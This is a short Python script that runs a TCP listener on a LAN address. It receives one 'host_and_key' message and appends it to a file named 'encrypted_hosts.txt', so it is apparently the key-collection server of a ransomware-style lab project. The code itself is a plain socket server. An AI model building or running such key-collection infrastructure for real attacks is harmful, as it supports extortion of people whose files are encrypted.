import socket

# socket info
IP_Address = '192.168.43.214'
PORT = 1234

print('creating socket')
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((IP_Address, PORT))
    s.listen(1)
    conn, addr = s.accept()
    print(f"connection from {addr} establish at port {PORT}")
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode()
            with open('encrypted_hosts.txt', 'a') as f:
                f.write(host_and_key + '\n')
            break
        print('connection completed and closed.')
